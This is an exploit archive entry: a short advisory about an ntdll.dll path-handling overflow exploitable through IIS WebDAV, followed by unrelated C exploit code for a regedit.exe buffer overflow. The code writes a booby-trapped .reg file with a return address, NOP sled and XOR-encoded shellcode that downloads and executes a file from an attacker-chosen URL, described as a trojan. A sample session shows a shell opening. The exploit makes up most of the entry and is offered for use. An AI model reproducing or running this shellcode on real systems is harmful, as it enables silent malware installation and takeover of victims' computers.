source: http://www.securityfocus.com/bid/7116/info
 
The Windows library ntdll.dll includes a function that does not perform sufficient bounds checking. The vulnerability is present in the function "RtlDosPathNameToNtPathName_U" and may be exploited through other programs that use the library if an attack vector permits it. One of these programs is the implementation of WebDAV that ships with IIS 5.0. The vector allows for the vulnerability in ntdll.dll to be exploited by a remote attacker.
 
Several other library functions which call the vulnerable ntdll.dll procedure have been identified. Administrators are advised to patch as other attack vectors are likely to surface.
 
** Microsoft has revised its advisory to state that this vulnerability affects Windows NT systems. As Windows NT does not support WebDAV, exploits using WebDAV as the attack vector will not be effective against Windows NT systems. Windows XP does not also include WebDAV by default, but other attack vectors may be possible, especially in cases where the attacker has interactive access to the system. WebDAV may be installed by a user on Windows XP with IIS 5.1, so WebDAV may be a possible means of exploitation in these circumstances.
 
** Reports suggest that numerous hosts have been scanned in an attempt to exploit this vulnerability. Although unconfirmed, this may be the result of a system of automated attacks.
 
** It has been reported that this vulnerability is also present in the "RtlGetFullPathName_U" function. The supplied Microsoft patch (Q815021) also corrects this function.
 
** It has been reported that the W32.Welchia.Worm, described in MCID 1811, is actively exploiting this vulnerability.

/***************************************
 *@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@*
 *@ REGEDIT Buffer Overflow Exploit ! @*
 *@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@*
 *                                     *
 *   Discovered & coded By ThreaT.     *
 *                                     *
 *#####################################*
 *# -> ThreaT@Ifrance.com             #*
 *# -> http://www.chez.com/mvm        #*
 *# -> http://s0h.cc/~threat          #*
 *#####################################*
 * Date : 31/03/2003                   *
 ***************************************
*/

/*
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 * This exploit create a malicious .reg file  *
 * that when it try to write data into the    *
 * registery, overwrite the ret addr, because * 
 * a ReadFile() unchecked function work with  *
 * a static buffer, and execute our abitrary  *
 * code who download a trojan for local       *
 * execution without user ask !               *
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 -> compile : cl regexploit.c

  usage : regexploit.exe <url>

  <url> is a full link to an executable file, it can be like
  http://www.host.com/trojan.exe or file://c:/path/executable.exe

*/

// Tested on Win2k pro & server (fr) SP0 SP1 SP2 & SP3

#include <windows.h>

HANDLE RegFile;

char *ToWideChar(const char *cszANSIstring) 
{
	int nBufSize;
	WCHAR *wideString;

	if(cszANSIstring == NULL) return NULL; 

	nBufSize = MultiByteToWideChar(CP_ACP, MB_PRECOMPOSED, cszANSIstring, -1, NULL, 0 );
	wideString = (WCHAR *)malloc(nBufSize +1);
	MultiByteToWideChar(CP_ACP, MB_PRECOMPOSED, cszANSIstring, -1, wideString, nBufSize);
	return (char*)(wideString);
}

void Write (const char *str, int number)
{
	DWORD lpNumberOfBytesWritten;
	WriteFile (RegFile,str,number,&lpNumberOfBytesWritten,NULL);
}

void main (int argc, char *argv[])
{
	int i;
	char entete[] = "Windows Registry Editor Version 5.00\r\n\r\n"
			"[HKEY_LOCAL_MACHINE\\SOFTWARE\\Discovered\\and\\coded\\by\\ThreaT]\r\n",

	*MastaBuff, *myurl,

	RealGenericShellcode[] = 

	"\xAA\xC6\x02\x01" // Adresse de retour

	// nop
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"

	// decrypteur de shellcode
	"\x68\x5E\x56\xC3\x90\x8B\xCC\xFF\xD1\x83\xC6\x0E\x90\x8B\xFE\xAC"
	"\x34\x99\xAA\x84\xC0\x75\xF8"

	// shellcode xorised avec 0x99
	"\x72\xeb\xf3\xa9\xc2\xfd\x12\x9a\x12\xd9\x95\x12\xd1\x95\x12\x58\x12\xc5\xbd\x91"
	"\x12\xe9\xa9\x9a\xed\xbd\x9d\xa1\x87\xec\xd5\x12\xd9\x81\x12\xc1\xa5\x9a\x41\x12"
	"\xc2\xe1\x9a\x41\x12\xea\x85\x9a\x69\xcf\x12\xea\xbd\x9a\x69\xcf\x12\xca\xb9\x9a"
	"\x49\x12\xc2\x81\xd2\x12\xad\x03\x9a\x69\x9a\xed\xbd\x8d\x12\xaf\xa2\xed\xbd\x81"
	"\xed\x93\xd2\xba\x42\xec\x73\xc1\xc1\xaa\x59\x5a\xc6\xaa\x50\xff\x12\x95\xc6\xc6"
	"\x12\xa5\x16\x14\x9d\x9e\x5a\x12\x81\x12\x5a\xa2\x58\xec\x04\x5a\x72\xe5\xaa\x42"
	"\xf1\xe0\xdc\xe1\xd8\xf3\x93\xf3\xd2\xca\x71\xe2\x66\x66\x66\xaa\x50\xc8\xf1\xec"
	"\xeb\xf5\xf4\xff\x5e\xdd\xbd\x9d\xf6\xf7\x12\x75\xc8\xc8\xcc\x66\x49\xf1\xf0\xf5"
	"\xfc\xd8\xf3\x97\xf3\xeb\xf3\x9b\x71\xcc\x66\x66\x66\xaa\x42\xca\xf1\xf8\xb7\xfc"
	"\xe1\x5f\xdd\xbd\x9d\xfc\x12\x55\xca\xca\xc8\x66\xec\x81\xca\x66\x49\xaa\x42\xf1"
	"\xf0\xf7\xdc\xe1\xf3\x98\xf3\xd2\xca\x71\xb5\x66\x66\x66\x14\xd5\xbd\x89\xf3\x98"
	"\xc8\x66\x49\xaa\x42\xf1\xe1\xf0\xed\xc9\xf3\x98\xf3\xd2\xca\x71\x8b\x66\x66\x66"
	"\x66\x49\x71\xe6\x66\x66\x66";

	printf ("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n"
		"Regedit.exe Buffer Overflow Exploit\n"
		"@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n"
		"Discovered & Coded By ThreaT.\n\n"
		"contact : ThreaT@Ifrance.com\n"
		"URL : http://www.chez.com/mvm\n\n");

	if (!argv[1])
	{
		printf ("_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_\n"
			"Usage   : regexploit.exe <URL://trojan.exe>\n"
			"Exemple : regexploit.exe file://c:/winnt/system32/cmd.exe\n"
			"_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_\n");
		ExitProcess (0);
	}

	/* Creation du fichier Reg malicieux */

	RegFile = CreateFile ("VulnFile.reg",GENERIC_WRITE,FILE_SHARE_WRITE,
			     NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);

	if (RegFile == INVALID_HANDLE_VALUE)
	{
		printf ("Cannot create a vuln regfile !\n");
		ExitProcess (0);
	}

	Write ("\xFF\xFE",2); // header .reg script
	Write (ToWideChar (entete),strlen (entete)*2); // ent� regedit
	
	MastaBuff = (char *) LocalAlloc (LPTR,270);		// rempli la premiere partie
	MastaBuff[0] = '"';	memset (&MastaBuff[1],'0',260); // avec des zeros
														
	Write (ToWideChar (MastaBuff),strlen (MastaBuff)*2); // Ecrit dans le fichier la 1er parti de la vuln str

	myurl = (char *) LocalAlloc (LPTR, strlen (argv[1])+10);
	lstrcpy (myurl,argv[1]);

	for (i=0; i < strlen (argv[1]); argv[1][i++]^=0x99); // encrypte l'URL
	lstrcat (RealGenericShellcode,argv[1]); // creation du shellcode final
	lstrcat (RealGenericShellcode,"\x99");  // caractere de terminaison

	Write (RealGenericShellcode,strlen (RealGenericShellcode)); // rajoute le shellcode au fichier

	CloseHandle (RegFile);

	printf ("un fichier .reg vulnerable appele VulnFile.reg viens d'etre cree\n"
		"pour downloader et executer '%s'\n",myurl);

}

/*********************

D:\code\exploits\regedit>cl regexploit.c
Microsoft (R) 32-bit C/C++ Optimizing Compiler Version 12.00.8168 for 80x86
Copyright (C) Microsoft Corp 1984-1998. All rights reserved.

regexploit.c
Microsoft (R) Incremental Linker Version 6.00.8168
Copyright (C) Microsoft Corp 1992-1998. All rights reserved.

/out:regexploit.exe
regexploit.obj

D:\code\exploits\regedit>regexploit
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Regedit.exe Buffer Overflow Exploit
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Discovered & Coded By ThreaT.

contact : ThreaT@Ifrance.com
URL : http://www.chez.com/mvm

_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_
Usage   : regexploit.exe <URL://trojan.exe>
Exemple : regexploit.exe file://c:/winnt/system32/cmd.exe
_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_

D:\code\exploits\regedit>regexploit file://c:/winnt/system32/cmd.exe
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Regedit.exe Buffer Overflow Exploit
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Discovered & Coded By ThreaT.

contact : ThreaT@Ifrance.com
URL : http://www.chez.com/mvm

un fichier .reg vulnerable appele VulnFile.reg viens d'etre cree
pour downloader et executer 'file://c:/winnt/system32/cmd.exe'

D:\code\exploits\regedit>dir VulnFile.reg
 Le volume dans le lecteur D n'a pas de nom.
 Le num� de s�e du volume est 90CC-3FC3

 R�rtoire de D:\code\exploits\regedit

31/03/2003  14:54                1 015 VulnFile.reg
               1 fichier(s)            1 015 octets
               0 R�s)   5 602 033 664 octets libres

D:\code\exploits\regedit>VulnFile.reg

D:\code\exploits\regedit>

  �s vous s� vouloir ajouter l'information dans d:\code\exploits\regedit\VulnFile.reg 
  dans le registre ?

  -> OUI

Microsoft Windows 2000 [Version 5.00.2195]
(C) Copyright 1985-1999 Microsoft Corp.

D:\code\exploits\regedit>


  this is too easy...

*********************/
